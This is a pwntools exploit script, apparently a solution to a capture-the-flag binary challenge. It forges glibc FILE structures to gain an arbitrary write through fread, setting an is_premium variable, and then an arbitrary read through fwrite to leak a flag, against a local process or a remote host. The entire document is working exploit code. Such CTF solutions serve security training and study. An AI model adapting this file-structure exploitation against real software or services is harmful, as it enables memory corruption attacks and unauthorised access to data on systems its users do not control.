#!/usr/bin/env python3 
from pwn import * 
import argparse 

parser = argparse.ArgumentParser() 
parser.add_argument("--host", default="localhost") 
parser.add_argument("--port", type=int, default=1337) 
parser.add_argument("--bin", default="challenge") 
args = parser.parse_args() 

# GLIBC 2.31
context(arch="amd64", os="linux") 
challenge_path = args.bin
elf = context.binary = ELF(challenge_path, checksec=True) 

if(args.host == "localhost"): 
    io = process(challenge_path) 
else:
    print(f"Connecting to {args.host}:{args.port}...")
    io = remote(args.host, args.port) 

win_addr = elf.symbols['win'] 
print(f"win() address: {hex(win_addr)}")
prenium_addr = elf.symbols['is_premium'] 
print(f"is_premium address: {hex(prenium_addr)}")

# set is_premium = 1 
# use file structure to write arbitrary memory via fread
fp = FileStructure() 
payload = fp.read(prenium_addr, prenium_addr+0x101) 
io.sendlineafter(b"> ", b"1") 
io.sendafter(b" :", payload) 
io.sendlineafter(b"...",b"\x01") 

# fetch flag in memory with premium access
io.sendlineafter(b"> ", b"2") 

# print flag 
# use file structure to read arbitrary memory via fwrite with premium access
fp2 = FileStructure() 
payload2 = fp2.write(win_addr, 60) 
io.sendlineafter(b"> ", b"3") 
io.sendafter(b" :", payload2) 

io.interactive()

